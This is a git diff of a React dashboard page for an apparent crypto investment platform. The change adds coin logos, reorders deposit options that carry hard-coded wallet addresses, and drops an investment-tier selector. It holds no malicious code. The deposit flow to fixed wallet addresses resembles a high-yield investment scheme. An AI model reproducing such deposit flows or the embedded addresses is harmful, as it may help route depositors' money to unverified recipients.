@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { motion } from 'motion/react';
+import { motion, AnimatePresence } from 'motion/react';
 import { Link, useNavigate, useSearchParams } from 'react-router-dom';
 import { useAuth } from '../context/AuthContext';
 import { useCurrency, currencyOptions } from '../context/CurrencyContext';
@@ -13,6 +13,11 @@ import {
   ArrowDownCircle, 
   ArrowUpCircle, 
   Bitcoin, 
+  Gem,
+  Triangle,
+  Feather,
+  Flame,
+  BadgeDollarSign,
   Zap, 
   Briefcase, 
   ShoppingBag, 
@@ -35,7 +40,6 @@ import {
   X,
   CheckCircle2
 } from 'lucide-react';
-import { AnimatePresence } from 'motion/react';
 import { 
   ResponsiveContainer, 
   AreaChart, 
@@ -474,13 +478,13 @@ export default function DashboardPage() {
   const netPortfolioValue = totalInvested + totalProfit;
 
   const cryptoAssets = [
-    { id: 'btc', name: 'Bitcoin', ticker: 'BTC', address: 'bc1qsa53wd67cxgm3nd7epum68ajdd6w7s8wkfdatj' },
-    { id: 'eth', name: 'Ethereum', ticker: 'ETH', address: '0xb01eD053938D65c13B817592F3Ac42C551ca2686' },
-    { id: 'usdt', name: 'USDT', ticker: 'USDT (ERC20)', address: '0xb01eD053938D65c13B817592F3Ac42C551ca2686' },
-    { id: 'sol', name: 'Solana', ticker: 'SOL', address: 'EZ9T1Jsuqt7Y5p8BpCRtN9KZV9qKBXkwexbCkDdhuqYm' },
-    { id: 'doge', name: 'Dogecoin', ticker: 'DOGE', address: 'DSTmUe2ZupEfPpsZtgpNbUqrHUAdXgTxe1' },
-    { id: 'ltc', name: 'Litecoin', ticker: 'LTC', address: 'ltc1qjx0uklf29m4yc87wqek3a23v8q0dcfe543dzz2' },
-    { id: 'trx', name: 'Tron', ticker: 'TRX', address: 'THihpgigHGEC8NjZAqN8R7wf4CWnwZomvT' },
+    { id: 'trx', name: 'Tron', ticker: 'TRX', image: 'https://cryptologos.cc/logos/tron-trx-logo.png', address: 'THihpgigHGEC8NjZAqN8R7wf4CWnwZomvT' },
+    { id: 'ltc', name: 'Litecoin', ticker: 'LTC', image: 'https://cryptologos.cc/logos/litecoin-ltc-logo.png', address: 'ltc1qjx0uklf29m4yc87wqek3a23v8q0dcfe543dzz2' },
+    { id: 'sol', name: 'Solana', ticker: 'SOL', image: 'https://cryptologos.cc/logos/solana-sol-logo.png', address: 'EZ9T1Jsuqt7Y5p8BpCRtN9KZV9qKBXkwexbCkDdhuqYm' },
+    { id: 'usdt', name: 'USDT', ticker: 'USDT (ERC20)', image: 'https://cryptologos.cc/logos/tether-usdt-logo.png', address: '0xb01eD053938D65c13B817592F3Ac42C551ca2686' },
+    { id: 'eth', name: 'Ethereum', ticker: 'ETH', image: 'https://cryptologos.cc/logos/ethereum-eth-logo.png', address: '0xb01eD053938D65c13B817592F3Ac42C551ca2686' },
+    { id: 'btc', name: 'Bitcoin', ticker: 'BTC', image: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png', address: 'bc1qsa53wd67cxgm3nd7epum68ajdd6w7s8wkfdatj' },
+    { id: 'doge', name: 'Dogecoin', ticker: 'DOGE', image: 'https://cryptologos.cc/logos/dogecoin-doge-logo.png', address: 'DSTmUe2ZupEfPpsZtgpNbUqrHUAdXgTxe1' },
   ];
 
   const selectedCrypto = cryptoAssets.find(c => c.id === paymentMethod);
@@ -588,25 +592,6 @@ export default function DashboardPage() {
                   className="card-panel p-10 space-y-8"
                 >
                   <div>
-                    <label className="text-[10px] font-mono text-slate-500 uppercase tracking-[0.3em] block mb-6">Select Investment Tier</label>
-                    <div className="grid grid-cols-3 gap-3">
-                      {['Starter', 'Growth', 'Elite'].map((tier) => (
-                        <button
-                          key={tier}
-                          onClick={() => setDepositTier(tier)}
-                          className={`py-4 px-2 rounded-lg border font-mono text-[9px] uppercase tracking-widest transition-all ${
-                            depositTier === tier 
-                              ? 'bg-brand-primary text-black border-brand-primary font-bold' 
-                              : 'bg-white/5 text-slate-500 border-white/10 hover:border-white/20'
-                          }`}
-                        >
-                          {tier}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-
-                  <div>
                     <label className="text-[10px] font-mono text-slate-500 uppercase tracking-[0.3em] block mb-6">Enter Allocation Amount (USD)</label>
                     <div className="relative">
                       <span className="absolute left-6 top-1/2 -translate-y-1/2 text-2xl font-mono text-slate-600">{selectedCurrency.symbol}</span>
@@ -624,7 +609,7 @@ export default function DashboardPage() {
                     Micro-denominations supported from $1. Institutional limits apply for unverified accounts.
                   </p>
                   <button 
-                    disabled={!depositAmount || parseFloat(depositAmount) <= 0 || depositTier === 'Not Set'}
+                    disabled={!depositAmount || parseFloat(depositAmount) <= 0}
                     onClick={() => setDepositStep(2)}
                     className="w-full mt-10 py-5 bg-white text-black font-bold uppercase tracking-[0.2em] text-[10px] rounded-xl hover:bg-brand-primary transition-all disabled:opacity-20 disabled:hover:bg-white"
                   >
@@ -648,7 +633,11 @@ export default function DashboardPage() {
                         className={`card-panel p-6 text-left transition-all border-2 ${paymentMethod === crypto.id ? 'border-brand-primary bg-brand-primary/5' : 'border-white/5 bg-white/[0.02] hover:bg-white/[0.05]'}`}
                       >
                         <div className="flex justify-between items-start mb-4">
-                          <Bitcoin className={`h-6 w-6 ${paymentMethod === crypto.id ? 'text-brand-primary' : 'text-slate-600'}`} />
+                          {crypto.image ? (
+                            <img src={crypto.image} alt={crypto.name} className="h-6 w-6 object-contain" referrerPolicy="no-referrer" />
+                          ) : (
+                            <BadgeDollarSign className={`h-6 w-6 ${paymentMethod === crypto.id ? 'text-brand-primary' : 'text-slate-600'}`} />
+                          )}
                           <span className="text-[8px] font-mono text-slate-500 uppercase">{crypto.ticker}</span>
                         </div>
                         <h4 className="text-[10px] font-bold uppercase tracking-widest">{crypto.name}</h4>
@@ -710,7 +699,15 @@ export default function DashboardPage() {
                   className="card-panel p-10 text-center"
                 >
                   <div className="w-20 h-20 bg-brand-primary/10 rounded-full flex items-center justify-center mx-auto mb-8">
-                    {paymentMethod !== 'bank' ? <Bitcoin className="h-10 w-10 text-brand-primary" /> : <ShieldCheck className="h-10 w-10 text-brand-primary" />}
+                    {paymentMethod !== 'bank' && selectedCrypto ? (
+                      selectedCrypto.image ? (
+                        <img src={selectedCrypto.image} alt={selectedCrypto.name} className="h-12 w-12 object-contain" referrerPolicy="no-referrer" />
+                      ) : (
+                        <BadgeDollarSign className="h-10 w-10 text-brand-primary" />
+                      )
+                    ) : (
+                      <ShieldCheck className="h-10 w-10 text-brand-primary" />
+                    )}
                   </div>
                   <h3 className="text-xl font-bold uppercase tracking-widest mb-4">
                     {paymentMethod !== 'bank' ? `Awaiting ${selectedCrypto?.ticker} Transfer` : 'Verification Initiated'}
@@ -758,7 +755,11 @@ export default function DashboardPage() {
                   {paymentMethod !== 'bank' && selectedCrypto && (
                     <div className="p-8 bg-black/40 border border-brand-primary/20 rounded-2xl text-left mb-8 relative overflow-hidden">
                       <div className="absolute top-0 right-0 p-4 opacity-5">
-                         <Bitcoin className="h-20 w-20 text-white" />
+                         {selectedCrypto.image ? (
+                           <img src={selectedCrypto.image} alt="" className="h-20 w-20 object-contain grayscale brightness-200" referrerPolicy="no-referrer" />
+                         ) : (
+                           <BadgeDollarSign className="h-20 w-20 text-white" />
+                         )}
                       </div>
                       <label className="text-[9px] font-mono text-brand-primary uppercase tracking-widest block mb-4">{selectedCrypto.name} Secure Destination</label>
                       <div className="flex items-center gap-4 bg-white/5 p-4 rounded-lg border border-white/5">
@@ -855,7 +856,7 @@ export default function DashboardPage() {
                       onClick={() => setWithdrawMethod('crypto')}
                       className={`card-panel p-6 text-left transition-all border-2 ${withdrawMethod === 'crypto' ? 'border-brand-primary bg-brand-primary/5' : 'border-white/5 bg-white/[0.02]'}`}
                     >
-                      <Bitcoin className="h-6 w-6 mb-3 text-slate-600" />
+                      <BadgeDollarSign className="h-6 w-6 mb-3 text-slate-600" />
                       <h4 className="text-[10px] font-bold uppercase tracking-widest">Crypto Wallet</h4>
                     </button>
                     <button 
